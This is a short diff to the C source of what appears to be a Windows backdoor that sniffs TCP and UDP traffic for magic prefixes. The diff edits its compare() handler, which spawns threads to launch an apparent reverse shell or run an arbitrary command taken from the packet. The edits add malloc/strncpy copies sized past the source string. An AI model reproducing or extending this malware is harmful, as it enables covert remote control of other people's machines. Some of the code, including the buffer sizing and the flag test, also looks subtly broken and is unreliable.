@@ -6,19 +6,24 @@ void compare(int payloadLength, char* data)
 	{
 		if (strncmp(data, SHELL, 6) == 0)
 		{
-			char* rip = (char*)data + 6;
+			/* char* rip = (char*)data + 6; */
+			char* rip = (char*)malloc(strlen(data)+6);
+			strncpy(rip, data+6, strlen(data)+6);
 #ifdef DEBUG
 			printf("%s", data);
 #endif
 			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&rev, rip, 0, NULL);
+
 		}
 		else if (strncmp(data, COMMAND, 6) == 0)
 		{
-			char* cmd = (char*)data + 6;
+			char* cmd = (char*)malloc(strlen(data)+6);
+			strncpy(cmd, data+6, strlen(data)+6);
 #ifdef DEBUG
-			printf("%s", data);
+			printf("%s", cmd);
 #endif
 			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&exec, cmd, 0, NULL);
+
 		}
 	}
 }
@@ -27,7 +32,6 @@ void compare(int payloadLength, char* data)
 void handleTCP(char* buffer, struct ip_hdr_s* ip_header) 
 {
 	struct tcp_hdr_s* tcp_header = (struct tcp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
-	uint16_t sport = ntohs(tcp_header->th_sport);
 	uint16_t flag = (uint16_t)tcp_header->th_flags;
 	if (flag >> 3 % 2)
 	{
@@ -45,7 +49,6 @@ void handleTCP(char* buffer, struct ip_hdr_s* ip_header)
 void handleUDP(char* buffer, struct ip_hdr_s* ip_header) 
 {
 	struct udp_hdr_s* udp_header = (struct udp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
-	uint16_t sport = ntohs(udp_header->source);
 	char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
 	int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_UDP;
 #ifndef DEBUG
